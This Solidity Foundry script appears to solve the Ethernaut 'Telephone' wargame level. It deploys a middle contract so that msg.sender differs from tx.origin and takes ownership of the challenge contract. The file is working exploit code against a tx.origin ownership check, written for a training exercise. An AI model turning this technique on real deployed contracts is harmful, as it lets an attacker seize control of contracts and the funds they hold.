pragma solidity ^0.8.0;

import "../src/level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract MiddleContract {
    Telephone public ins = Telephone(0x259703Df5d6eEe5e79c58DdbA513a023Ea120135);

    function changeOwner(address _owner) public {
        ins.changeOwner(_owner);
        console.log(ins.owner());
    }
}
contract Solution is Script {

    // SPDX-License-Identifier: MIT
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // tx.origin is the original sender of the transaction
        // msg.sender is the current sender of the transaction
        MiddleContract middle = new MiddleContract();
        middle.changeOwner(vm.envAddress("MY_ADDRESS"));
       
        vm.stopBroadcast();
    }
}